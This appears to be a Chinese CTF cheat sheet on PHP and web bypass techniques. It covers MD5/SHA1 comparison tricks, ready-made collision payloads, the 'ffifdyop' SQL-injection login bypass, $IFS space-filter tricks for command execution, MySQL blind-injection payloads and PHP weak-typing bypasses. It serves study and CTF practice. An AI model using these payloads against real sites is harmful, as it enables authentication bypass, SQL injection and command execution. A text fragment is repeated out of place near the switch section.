## [md5加密](https://so.csdn.net/so/search?q=md5加密&spm=1001.2101.3001.7020)bypass

### 弱比较绕过

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    echo 'success!';
}
```

#### 方法一：0e绕过

**绕过原理：**PHP在处理字符串时会出现缺陷，如果字符串为’5e2’，本来只是一个正常字符串，但PHP会认为这是科学计数法里的e，那么PHP进行比较时会将这个字符串按照科学计数法计算，即5e2=5*10^2=500，由此0e100被认为和0相等。md5加密后的哈希值是一串16进制数，因此需要哈希值第一位为0，第二位为e即可，后面不论是什么都认为和0相等

以下字符串经过md5函数后以’0e’开头：

- QNKCDZO
- 240610708
- s878926199a
- s155964671a
- s1091221200a
- s1665632922a

经过md5函数加密一次和两次后均以’0e’开头：

- 7r4lGXCH2Ksu2JNT3BYM
- CbDLytmyGm2xQyaLNhWn
- 770hQgrBOjrcqftrlaZk

有时候题目还会用ctype_alnum()、is_numeric()或正则表达式来限制原值是纯字母或纯数字

###### 方法二：数组绕过

**绕过原理**：无论是PHP弱比较还是强比较，md5()函数无法处理数组，如果传入的是数组，会返回NULL，两个数组经过加密后返回值均为NULL，形成相等

payload

```tex
?a[]=1&b[]=2
```

### 强比较绕过

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) === md5($b)){
    echo 'success!';
}
```

> 虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。
>
> 松散比较：使用两个等号 == 比较，只比较值，不比较类型。
> 严格比较：用三个等号 === 比较，除了比较值，也比较类型。
> 例如，“42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。

#### 方法：数组绕过

细节如上所述

### md5碰撞绕过

```php
<?php
$a = (string)$_POST['a'];
$b = (string)$_POST['b'];
if($a != $b && md5($a) === md5($b)){
    echo 'success!';
}
```

由于强制类型转换，传入数组会得到’Array’，这里我们只能需要一个md5前不等，md5后相等的值

###### 方法：使用Fastcoll生成

详细可见[这篇文章](https://blog.csdn.net/shuaicenglou3032/article/details/118197904)

下面给出payload供使用：

```tex
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

POST传参时需要再次url编码

```tex
x%3D%254d%25c9%2568%25ff%250e%25e3%255c%2520%2595%2572%25d4%2577%257b%2572%2515%2587%25d3%256f%25a7%25b2%251b%25dc%2556%25b7%254a%253d%25c0%2578%253e%257b%2595%2518%25af%25bf%25a2%2500%25a8%2528%254b%25f3%256e%258e%254b%2555%25b3%255f%2542%2575%2593%25d8%2549%2567%256d%25a0%25d1%2555%255d%2583%2560%25fb%255f%2507%25fe%25a2%26y%3D%254d%25c9%2568%25ff%250e%25e3%255c%2520%2595%2572%25d4%2577%257b%2572%2515%2587%25d3%256f%25a7%25b2%251b%25dc%2556%25b7%254a%253d%25c0%2578%253e%257b%2595%2518%25af%25bf%25a2%2502%25a8%2528%254b%25f3%256e%258e%254b%2555%25b3%255f%2542%2575%2593%25d8%2549%2567%256d%25a0%25d1%25d5%255d%2583%2560%25fb%255f%2507%25fe%25a2
```

### md5截断比较

```php
<?php
$a=$_GET['a'];
if(substr(md5($str), 0, 6) === "edef"){
    echo 'success!';
}
```

###### 方法：脚本爆破

遇到这种情况可以通过写脚本爆破的方法，通常花费时间较长

```python
from multiprocessing.dummy import Pool as tp
import hashlib

knownMd5 = '666666'      #已知的md5明文

def md5(text):
    return hashlib.md5(str(text).encode('utf-8')).hexdigest()

def findCode(code):
    key = code.split(':')
    start = int(key[0])
    end = int(key[1])
    for code in range(start, end):
        if md5(code)[0:6] == knownMd5:
            print(code)
list=[]
for i in range(1):    # 这里的range(number)指爆破出多少结果停止
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = tp()    # 使用多线程加快爆破速度
pool.map(findCode, list)
pool.close()
pool.join()
```

### 原值和md5加密后哈希值弱比较绕过

```php
<?php
$a=$_GET['a'];
if($a == md5($a)){
    echo 'success!';
}
```

#### 方法：0e绕过

`0e215962017` 的 md5 值也是由’0e’开头，在 PHP 弱类型比较中相等

### SQL注入中的md5绕过

```sql
Select * from ’admin’ where password=md5($pass,true)
```

###### 方法：构造万能密码

`ffifdyop`这个特殊的字符串，非常之经典

**绕过原理：**利用`ffifdyop`这个字符串md5函数处理后哈希值为`276f722736c95d99e921722cf9ed621c`，Mysql刚好会把hex转化成字符串，恰好这个哈希值转化后是’or’6<乱码> 即`'or'66�]��!r,��b`，这样就构成了一个万能密码。除了这个字符串之外，`129581926211651571912466741651878684928`也有同样的效果

### NAN和INF

```php
<?php
$a = NAN;
$b = NAN;
if($a != $b && md5($a) == md5($b)){
    echo 'success!';
}
```

**绕过原理：**NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN=NAN都是false，但md5(‘NAN’)=md5(‘NAN’)为true。（我试了试发现NAN雀实可以，但INF没成功不知道为啥，不解…）

## sha1加密bypass

sha1加密的绕过和MD5是异曲同工的

### 强弱比较绕过

#### 方法：数组绕过

sha1函数同样无法处理数组，如果传入数组会返回NULL，可以绕过强弱比较

### sha1碰撞

```tex
a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1

b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

这是两个SHA1值相同而不一样(SHA256的值不同)的pdf文件

## 空格过滤绕过

### Linux下

```php
<?php
$a=$_GET['a'];
if(preg_match('/ /',$a)){
    die('wrong!')
}else{
    echo 'success!';
    eval($a);
}
```

#### $IFS

```bash
cat${IFS}flag
cat$IFS$9flag
cat$IFS$1flag
```

**绕过原理：**Linux下有一个特殊的环境变量叫做 IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。单纯的cat\$IFSxxx，bash解释器会把整个IFSxxx当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，为什么要用$9呢？因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。$1同理

#### < <> {,} %09 %20

```bash
cat<flag
cat<>flag
{cat,flag}
cat%09flag
cat%20flag
```

< 或<>与通配符一起使用时没有回显，使用不能同时使用

用逗号实现空格功能，需要用{}括起来

在PHP环境下可以使用%09(tab)绕过空格

### MySQL下

#### 利用注释绕过

**绕过原理**：/**/是注释符，用注释替换空格

```sql
select/**/column_name/**/from/**/information_schema.tables/**/where/**/table_name="users"
```

补充：

`/* … */`在大部分语言中都一样是注释。这个之中的语句是不被执行的。但MySQL中 为了保持兼容，比如从mysqldump 导出的SQL语句能被其它数据库直接使用，它把一些特有的仅在MySQL上的语句放在 /*! … */ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。

`/*!50001 select * from test */;`
这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被推行

#### 利用括号绕过

**绕过原理**：在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

```html
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```

常用于时间盲注，上面语句表示猜解database（）第一个字符ascii码是否为109，若是则加载延时。from for属于逗号绕过，在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号

#### 利用特殊字符

```tex
%20 %09 %0a %0b %0c %0d %a0 %00
```

## 弱类型漏洞

### strcmp函数绕过

```php
<?php
$id=$_GET['id'];
if(strcmp($secret,$id)==0){
	echo 'success!';
}
```

**绕过原理**：利用strcmp函数将数组或者对象类型与字符串进行比较会返回-1，但是从5.3开始，会返回0

当传入`?id[]=1`时即可bypass

### is_numeric()

```php
if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}
```

**绕过原理：**利用is_numeric的特性，传入`数字+字母`的时候，不会认为它是一个数字，但在比较大小时，可以正常比较，传入`2024a`即可

### array_search（）、in_array()绕过

```php
<?php
if(!is_array($_GET['test'])){exit();}  // 判断是否为数组
$test=$_GET['test'];
for($i=0;$i<count($test);$i++){  //遍历数组内容，所有内容均不能为admin，类型也必须相同
    if($test[$i]==="admin"){
        echo "error";
        exit();
    }
    $test[$i]=intval($test[$i]);  //转化为int型
}
if(array_search("admin",$test)===0){
    echo "flag";
}
else{
    echo "false";
}
?>
```

**绕过原理：**array_search() 函数在数组中搜索某个键值，并返回对应的键名。in_array() 函数搜索数组中是否存在指定的值。基本功能是相同的，也就是说绕过姿势也相同。利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：?test[]=0。

### switch()绕过

**绕过原理：**如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，例如：

```php
<?php
$i ="3name";
switch ($i) {
case 0:
case 1:
case 2:
     echo "this is two";
     break;
case 3:
     echo "flag";
break;
}
?>
```

索数组中是否存在指定的值。基本功能是相同的，也就是说绕过姿势也相同。利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：`?test[]=0`

### 布尔类型 True 与非零非 NULL 变量比较都会是 True

根据PHP手册内容

在PHP中任何类型的值, 与bool比较都会被转化成bool比较当转换为 bool 时，以下值被认为是 **`false`**：

- 布尔值 **`false`** 本身
- 整型值 `0`（零）
- 浮点型值 `0.0`（零）`-0.0`（零）
- 空字符串 `""`，以及字符串 `"0"`
- 不包括任何元素的数组
- 单位类型 NULL（包括尚未赋值的变量）
- 内部对象的强制转换行为重载为 bool。例如：由不带属性的空元素创建的 [SimpleXML](https://www.php.net/manual/zh/ref.simplexml.php) 对象。

所有其它值都被认为是 **`true`**（包括 [资源](https://www.php.net/manual/zh/language.types.resource.php) 和 **`NAN`**）

### extract变量覆盖

直接传入对应的变量名，变量名生成会有一个$x的过程，导致变量覆盖